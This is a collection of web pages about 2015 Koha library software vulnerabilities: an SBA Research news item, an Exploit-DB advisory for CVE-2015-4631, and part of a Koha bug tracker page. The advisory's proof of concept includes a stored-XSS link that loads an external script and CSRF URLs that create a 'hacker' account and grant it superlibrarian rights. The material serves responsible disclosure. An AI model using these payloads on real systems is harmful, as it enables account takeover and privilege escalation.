  + [Software Security](https://www.sba-research.org/professional-services/#filter?scopes=testing-audits%2Cconsulting%2Ctrainings&technology=software-security&service=)
  + [Cloud Security](https://www.sba-research.org/professional-services/#filter?scopes=testing-audits%2Cconsulting%2Ctrainings&technology=cloud-security&service=)
  + [Security Governance](https://www.sba-research.org/professional-services/#filter?scopes=testing-audits%2Cconsulting%2Ctrainings&technology=security-governance&service=)
  + [Infrastructure Security](https://www.sba-research.org/professional-services/#filter?scopes=testing-audits%2Cconsulting%2Ctrainings&technology=infrastructure-security&service=)
  + [IoT/Hardware Security](https://www.sba-research.org/professional-services/#filter?scopes=testing-audits%2Cconsulting%2Ctrainings&technology=iot-hardware-security&service=)
  + [People Centric Security](https://www.sba-research.org/professional-services/#filter?scopes=testing-audits%2Cconsulting%2Ctrainings&technology=people-centric-security&service=)
  + [Datenschutz](https://www.sba-research.org/professional-services/#filter?scopes=testing-audits%2Cconsulting%2Ctrainings&technology=datenschutz&service=)
* [Security Trainings](https://www.sba-research.org/professional-services/security-training/)
  + [API Security](https://www.sba-research.org/professional-services/security-training/api-security/)
  + [AWS Cloud Security](https://www.sba-research.org/professional-services/security-training/aws-cloud-security/)
  + [CISA Vorbereitungskurs](https://www.sba-research.org/professional-services/security-training/cisa-training/)
  + [CISM Vorbereitungskurs](https://www.sba-research.org/professional-services/security-training/cism/)
  + [CISSP Vorbereitungskurs](https://www.sba-research.org/professional-services/security-training/cissp/)
  + [Cyber Security Essentials](https://www.sba-research.org/professional-services/security-training/cybersecurity-essentials/)
  + [Cyber Security Fundamentals](https://www.sba-research.org/professional-services/security-training/cyber-security-fundamentals)
  + [Führungskräfte Awareness](https://www.sba-research.org/professional-services/security-training/fuhrungskrafte-awareness/)
  + [IoT Security Essentials](https://www.sba-research.org/professional-services/security-training/iot-security-essentials/)
  + [Secure Coding Fundamentals](https://www.sba-research.org/professional-services/security-training/secure-coding-fundamentals/)
  + [Security Awareness Training](https://www.sba-research.org/professional-services/security-training/security-awareness-training/)
  + [SOC (Security Operation Centers) – Basis Kurs](https://www.sba-research.org/professional-services/security-training/soc-security-operation-centers-basis-kurs)
  + [SDLC Fundamentals](https://www.sba-research.org/professional-services/security-training/ssdlc-fundamentals/)
  + [Threat Modeling Fundamentals](https://www.sba-research.org/professional-services/security-training/hands-on-threat-modeling/)
  + [Web Application Hacking](https://www.sba-research.org/professional-services/security-training/web-application-hacking/)
  + [Windows Hacking](https://www.sba-research.org/professional-services/security-training/windows-hacking/)
* [SBA Academy](https://www.sba-research.org/sba-academy/)
* [Events](https://www.sba-research.org/events/)
  + [SBA Meetup Groups](https://www.sba-research.org/sba-meetup-groups/)
  + [securepizza.club @ SBA Research](https://www.sba-research.org/securepizza-club-sba-research/)
* [Working at SBA](https://www.sba-research.org/working-at-sba/)
  + [Jobs](https://www.sba-research.org/jobs/)
* [About](https://www.sba-research.org/about/)
  + [Team](https://www.sba-research.org/team/)
    - [Management](https://www.sba-research.org/department/management/)
    - [Scientific Board](https://www.sba-research.org/department/scientific-board/)
    - [Key Researchers](https://www.sba-research.org/department/key-researchers/)
    - [Senior Staff](https://www.sba-research.org/department/senior-staff/)
    - [Staff](https://www.sba-research.org/department/staff/)
    - [Alumni](https://www.sba-research.org/department/alumni/)
  + [Current COMET Center SBA-K1](https://www.sba-research.org/comet-center/)
  + [Partners](https://www.sba-research.org/about/partners/)
  + [Associations & Networks](https://www.sba-research.org/about/associations-networks/)
  + [Sustainable Development Goals (SDG)](https://www.sba-research.org/about/sustainable-development-goals-sdg/)
  + [Jobs](https://www.sba-research.org/jobs/)
  + [ISO 27001:2013](https://www.sba-research.org/iso-270012013/)
  + [Vulnerability Disclosure Policy](https://www.sba-research.org/about/vulnerability-disclosure-policy/)
  + [Contact](https://www.sba-research.org/about/contact/)

[Subscribe to our Newsletter](https://www.sba-research.org/about/newsletter)

* [SBA Website Privacy Policy – English Version](https://www.sba-research.org/privacy-policy/)
* [Imprint](https://www.sba-research.org/imprint/)
* [Contact](https://www.sba-research.org/about/contact/)
* [SBA Whistleblowing (Tor-Browser only)](http://pwomk4sujrekpyjqrtz4tijdshyjygli2sxbrpl64zgcga25c43binad.onion)

# News

 » News

## Researchers of SBA Research found several critical security vulnerabilities in the Koha Library software via Combinatorial Testing

 June 24, 2015

Raschin Tavakoli, Bernhard Garn, Peter Aufner and Dimitris Simos of the Combinatorial Security Testing Team of SBA Research found several critical security vulnerabilities in the Koha Library Software. The vulnerabilities involve a variety of serious issues like unauthenticated SQL Injection, Local File Inclusions, XSS and XRFS which allow remote attackers to completely compromise the web application and web server. After a full disclosure to the community the development team of Koha fixed all issues and published a security release. SBA Research would like to thank Chris Cormack and his team.

Koha is a leading open source Integrated Libray Systen (ILS), used world-wide by thousands of public, school and special libraries. It has an active community and several commercial supporters like LibLime, ByWaterSolutionsand and BibLibre. Famous Koha users include the Museum of Natural History in Vienna, the UNIDO library and the Spanish Ministry of Culture.

More details can be found at:

<http://koha-community.org/security-release-koha-3-20-1/><http://koha-community.org/security-release-koha-3-18-8/><http://koha-community.org/security-release-koha-3-16-12/>

<http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14412><http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14408><http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14426><http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14416><http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14418><http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14423>

#### SBA Newsletter

[Subscribe to our Newsletter](/about/newsletter)
#### [Upcoming events @ SBA](https://www.sba-research.org/events/)

**[SHECURITY – Hackerinnen Training](https://www.sba-research.org/events/shecurity-hackerinnen-training/ "SHECURITY – Hackerinnen Training")**
29.01.2025

**[Machine Learning: Security Privacy & Legal Aspects](https://www.sba-research.org/events/machine-learning-security-privacy-legal-aspects/ "Machine Learning: Security Privacy & Legal Aspects")**
25.03.2025

**[ARES 2025](https://www.sba-research.org/events/ares-2025/ "ARES 2025")**
11.08.2025 - 14.08.2025

#### [SBA Research at a glance](https://www.sba-research.org/?tag=highlights,glancebox)

**[ACM Transactions on Management Information Systems – Paper accepted](https://www.sba-research.org/2025/01/23/acm-transactions-on-management-information-systems-paper-accepted/ "ACM Transactions on Management Information Systems – Paper accepted")**
New paper “Conceptual service architecture to synchronise research data management services using machine-actionable data management plans” by Tomasz Miksa, senior researcher at SBA Research and senior scientist at TU Wien, was recently accepted for the ACM Transactions on Management Information Systems Journal. [∞](https://www.sba-research.org/2025/01/23/acm-transactions-on-management-information-systems-paper-accepted/)

**[Gabriel Gegenhuber @ Black Hat Europe 2024](https://www.sba-research.org/2025/01/22/gabriel-gegenhuber-black-hat-europe-2024/ "Gabriel Gegenhuber @ Black Hat Europe 2024")**
In December, our colleague Gabriel Gegenhuber, researcher at SBA Research and University of Vienna, and… [∞](https://www.sba-research.org/2025/01/22/gabriel-gegenhuber-black-hat-europe-2024/)

**[SBA Research Strategy Seminar 2024](https://www.sba-research.org/2025/01/17/sba-research-strategy-seminar-2024/ "SBA Research Strategy Seminar 2024")**
On December 13th, SBA Research employees gathered at the Kardinal König Haus in Vienna for a one-day strategy seminar. The… [∞](https://www.sba-research.org/2025/01/17/sba-research-strategy-seminar-2024/)

#### Highlights of the past years:

* [Highlights 2023](https://www.sba-research.org/2023/?tag=highlights,glancebox)
* [Highlights 2022](https://www.sba-research.org/2022/?tag=highlights,glancebox)
* [Highlights 2021](https://www.sba-research.org/2021/?tag=highlights,glancebox)
* [All Highlights](https://www.sba-research.org/?tag=highlights,glancebox)

[![BMK](https://www.sba-research.org/wp-content/themes/sba-research-theme/assets/images/partner-logos/bmk_en.svg)](https://www.bmk.gv.at/)

[![BMAW](https://www.sba-research.org/wp-content/themes/sba-research-theme/assets/images/partner-logos/bmaw_en.svg)](https://www.bmaw.gv.at/)

[![FFG](https://www.sba-research.org/wp-content/themes/sba-research-theme/assets/images/partner-logos/ffg_en.svg)](https://www.ffg.at/)

[![Vienna Business Agency](https://www.sba-research.org/wp-content/themes/sba-research-theme/assets/images/partner-logos/vienna-business-agency.svg)](https://wirtschaftsagentur.at/)

[![European Commission](https://www.sba-research.org/wp-content/themes/sba-research-theme/assets/images/partner-logos/european-commission.svg)](https://commission.europa.eu/index_de)

[![Austrian Science Fund](https://www.sba-research.org/wp-content/themes/sba-research-theme/assets/images/partner-logos/fwf_en.svg)](https://www.fwf.ac.at/de/)

[![netidee](https://www.sba-research.org/wp-content/themes/sba-research-theme/assets/images/partner-logos/netidee.svg)](https://www.netidee.at/)

* [SBA Website Privacy Policy – English Version](https://www.sba-research.org/privacy-policy/)
* [Imprint](https://www.sba-research.org/imprint/)
* [Contact](https://www.sba-research.org/about/contact/)
* [SBA Whistleblowing (Tor-Browser only)](http://pwomk4sujrekpyjqrtz4tijdshyjygli2sxbrpl64zgcga25c43binad.onion)

SBA Research (SBA-K1) is a COMET Center within the [COMET – Competence Centers for Excellent Technologies Programme](https://www.ffg.at/comet) and funded by BMK, BMAW, and the federal state of Vienna.

The COMET Programme is managed by FFG.

© SBA Research gGmbH 2025



=== Content from www.exploit-db.com_0980b8a3_20250125_014246.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Koha 3.20.1 - Multiple Cross-Site Scripting / Cross-Site Request Forgery Vulnerabilities

#### EDB-ID:

###### 37389

#### CVE:

###### [2015-4631](https://nvd.nist.gov/vuln/detail/CVE-2015-4631) [2015-4630](https://nvd.nist.gov/vuln/detail/CVE-2015-4630)

---

**EDB Verified:**

#### Author:

###### [Raschin Tavakoli, Bernhard Garn, Peter Aufner & Dimitris Simos](/?author=8075)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2015-06-26

---

**Vulnerable App:**

```
# Exploit Title: Koha Open Source ILS - Multiple XSS and XSRF Vulnerabilities
# Google Dork:
# Date: 25/06/2015
# Exploit Author: Raschin Tavakoli, Bernhard Garn, Peter Aufner and Dimitris Simos - Combinatorial Security Testing Group of SBA Research (cst@sba-research.org)
# Vendor Homepage: koha-community.org
# Software Link: https://github.com/Koha-Community/Koha
# Version: 3.20.x <= 3.20.1, 3.18.x <= 3.18.8, 3.16.x <= 3.16.12
# Tested on: Debian Linux
# CVE : CVE-2015-4630, CVE-2015-4631

### CVE-2015-4631 ###

#### Titel: ####
Multiple XSS and XSRF vulnerabilities in Koha

#### Type of vulnerability: ####
Koha suffers from multiple critical XSS and XSRF vulnerabilities

##### Exploitation vector:
The attack can be performed through a compromised user account (for example previous password retrieval if student user acoount through SQLI - CVE-2015-4633) or due to user that clicks on a malicious link (for example in a phishing mail, forum link etc)

##### Attack outcome:
1. An attacker may escalate privileges and even gain superlibrarian permissions.
2. An attacker may target other users by stealing session tokens, impersonating them or exploiting browser vulnerabilities to gain access on their machines.
3. Perform unauthorized actions with the permissions of a staff member
4. Exploit other known server-side vulnerabilities (see CVE-2015-4633 and CVE-2015-4632) to fully compromise the websever

#### Impact: ####
{low,medium,high,critical}
critical

#### Software/Product name: ####
Koha

#### Affected versions: ####
* <= Koha 3.20.1
* <= Koha 3.18.8
* <= Koha 3.16.12

#### Fixed in version: ####
* version 3.20.1 http://koha-community.org/security-release-koha-3-20-1/,
* version 3.18.8 http://koha-community.org/security-release-koha-3-18-8/,
* version 3.16.12 http://koha-community.org/security-release-koha-3-16-12/

#### Vendor: ####
http://koha-community.org/ (Open Source)

#### CVE number: ####
CVE-2015-4631

#### Timeline ####
* `2015-06-18` identification of vulnerability
* `2015-06-18` 1st contact to release maintainer, immediate reply
* `2015-06-23` new release with fixed vulnerabilities

#### Credits: ####
RGhanad-Tavakoli@sba-research.org
---
Vulnerability Disclosure by Combinatorial Security Testing Group of SBA Research.
Contact: cst@sba-research.org

#### References:
http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14416
http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14423
http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14418

http://koha-community.org/security-release-koha-3-20-1/
http://koha-community.org/security-release-koha-3-18-8/
http://koha-community.org/security-release-koha-3-16-12/

#### Description: ####
Koha suffers from various critical XSS and XSRF vulnerabilities due to imprope input validation. The site also lacks in the implementation of challenge tokens that prevent cross-site forgery (XSRF) attacks. This allows remote remote attackers to inject arbitrary web script or HTML and completely compromise the webpage.

The following pages are affected from stored XSS flaws:

/cgi-bin/koha/opac-shelves.pl
/cgi-bin/koha/virtualshelves/shelves.pl

The following pages are affected from relfective XSS flaws:

/cgi-bin/koha/opac-shelves.pl 				(parameters: "direction", "display")
/cgi-bin/koha/opac-search.pl 				(parameters: "tag")
/cgi-bin/koha/authorities/authorities-home.pl 		(parameters: "value")
/cgi-bin/koha/acqui/lateorders.pl 			(parameters: "delay")
/cgi-bin/koha/admin/auth_subfields_structure.pl 	(parameters: "authtypecode","tagfield")
/cgi-bin/koha/admin/marc_subfields_structure.pl		(parameters: "tagfield")
/cgi-bin/koha/catalogue/search.pl			(parameters: "limit")
/cgi-bin/koha/serials/serials-search.pl			(parameters: "bookseller_filter", "callnumber_filter", "EAN_filter", "ISSN_filter", "publisher_filter", "title_filter")
/cgi-bin/koha/suggestion/suggestion.pl 			(parameters: "author", "collectiontitle", "copyrightdate", "isbn", "manageddate_from", "manageddate_to", "publishercode", "suggesteddate_from", "suggesteddate_to")

#### Proof-of-concept: ####
Attack scenario:

Alice, a student with restricted permissions on the system, receives a phishing mail (or reads in some forum) and clicks the following link:

http://<opac-interface>/cgi-bin/koha/opac-shelves.pl?shelves=1&addshelf=Malicious+Input+<script+src='http://cst.sba-research.org/x.js'/>&sortfield=title&category=2&allow_add=0&allow_delete_own=1&allow_delete_other=0

Bob, library admin, recognizes the new malicious list entry. He logs into the staff area and browses the public lists in order to delete the entry. Once he opens

http://<staff-interface>/cgi-bin/koha/virtualshelves/shelves.pl

the malcious code get's executed. The code can then perform any unauthorized actions with the pemissions of user bob. For example:

Create new user:

http://testbox:9002/cgi-bin/koha/members/memberentry.pl?nodouble=&destination=&check_member=&borrowernumber=&nodouble=&title=&firstname=&othernames=&sex=&streetnumber=&streettype=&address2=&city=&state=&zipcode=&country=&phone=&phonepro=&mobile=&email=&emailpro=&fax=&B_address=&B_address2=&B_city=&B_state=&B_zipcode=&B_country=&B_phone=&B_email=&contactnote=&altcontactsurname=&altcontactfirstname=&altcontactaddress1=&altcontactaddress2=&altcontactaddress3=&altcontactstate=&altcontactzipcode=&altcontactcountry=&altcontactphone=&sort1=&sort2=&dateexpiry=&opacnote=&borrowernotes=&patron_attr_1=&BorrowerMandatoryField=surname%7Cdateofbirth%7Ccardnumber%7Caddress&category_type=A&updtype=I&op=insert&surname=hacker&dateofbirth=10%2F06%2F2000&address=fictional&select_city=%7C%7C%7C&cardnumber=9182734629182364&branchcode=MAURES&categorycode=P_COM&dateenrolled=24%2F06%2F2015&userid=hacker&password=hacker&password2=hacker&patron_attr_1_code=PROFESSION&setting_messaging_prefs=1&modify=yes&borrowernumber=&save=Save&setting_extended_patron_attributes=1

Give the new user superlibririan permission:

http://testbox:9002/testbox:9002/cgi-bin/koha/members/member-flags.pl?member=7855&newflags=1&flag=superlibrarian

The attacker can now log as superlibrarian.

Side Note: In order to make the attack work, alice needs to be logged in to the Open Public Catalog interface at the time of when clicking the malicious link.
Alice needs to have access to the OPAC interface and to have permissions to create public lists.

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from bugs.koha-community.org_710d70d8_20250125_014240.html ===


Bugzilla – Bug 14423
Multiple XSS and XSRF issues in Staff Client
Last modified: 2017-06-14 22:10:31 UTC

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.2/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=14423&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=14423&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 14423**](show_bug.cgi?id=14423)
- Multiple XSS and XSRF issues in Staff Client

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
Multiple XSS and XSRF issues in Staff Client

| | [Status](page.cgi?id=fields.html#bug_status): | CLOSED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Koha | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Koha "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Staff interface ([show other bugs](buglist.cgi?component=Staff%20interface&product=Koha&bug_status=__open__)) | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | Main | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All All | |  | | | [Importance](page.cgi?id=fields.html#importance): | P5 - low major | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Bugs List | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") | Testopia | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [13618](show_bug.cgi?id=13618 "CLOSED FIXED - Add additional template filter methods and a filter presence test to Koha") [14568](show_bug.cgi?id=14568 "CLOSED FIXED") | |  | Show dependency [tree](showdependencytree.cgi?id=14423&hide_resolved=1) / [graph](showdependencygraph.cgi?id=14423) | |  | | Reported: | 2015-06-19 14:35 UTC by Raschin Tavakoli | | --- | --- | | Modified: | 2017-06-14 22:10 UTC ([History](show_activity.cgi?id=14423)) | | CC List: | 9 users (show)  chris dsimos fridolin.somers gmcharlt jonathan.druart liz mtj robin tomascohen | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Change sponsored?:](page.cgi?id=fields.html#cf_sponsorship "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Patch complexity:](page.cgi?id=fields.html#cf_patch_complexity "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Documentation contact:](page.cgi?id=fields.html#cf_docs_contact "The person taking responsibility for documenting the change introduced in this bug.") |  | | [Documentation submission:](page.cgi?id=fields.html#cf_manual "gitlab merge request url for this documentation submission") |  | | [Text to go in the release notes:](page.cgi?id=fields.html#cf_release_notes "A custom Large Text Box field in this installation of Bugzilla.") |  | | [Version(s) released in:](page.cgi?id=fields.html#cf_release_version "A custom Large Text Box field in this installation of Bugzilla.") |  | | [Circulation function:](page.cgi?id=fields.html#cf_circulation_subcomponent "A custom Multiple-Selection Box field in this installation of Bugzilla.") |  | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [**Screenshots**](attachment.cgi?id=40383 "View the content of the attachment") (3.31 MB, application/x-compressed-tar)  [2015-06-19 14:35 UTC](#attach_40383 "Go to the comment associated with the attachment"), Raschin Tavakoli | [Details](attachment.cgi?id=40383&action=edit) | | [**Bug 14423 : XSS in authorities-home**](attachment.cgi?id=40435 "View the content of the attachment") (2.28 KB, patch)  [2015-06-21 08:12 UTC](#attach_40435 "Go to the comment associated with the attachment"), Chris Cormack | [Details](attachment.cgi?id=40435&action=edit) | [Diff](attachment.cgi?id=40435&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40435) | | [**Bug 14423 : XSS bug in lateorders**](attachment.cgi?id=40436 "View the content of the attachment") (2.38 KB, patch)  [2015-06-21 08:20 UTC](#attach_40436 "Go to the comment associated with the attachment"), Chris Cormack | [Details](attachment.cgi?id=40436&action=edit) | [Diff](attachment.cgi?id=40436&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40436) | | [**Bug 14423 XSS bug in auth\_subfields\_structure**](attachment.cgi?id=40437 "View the content of the attachment") (6.99 KB, patch)  [2015-06-21 08:36 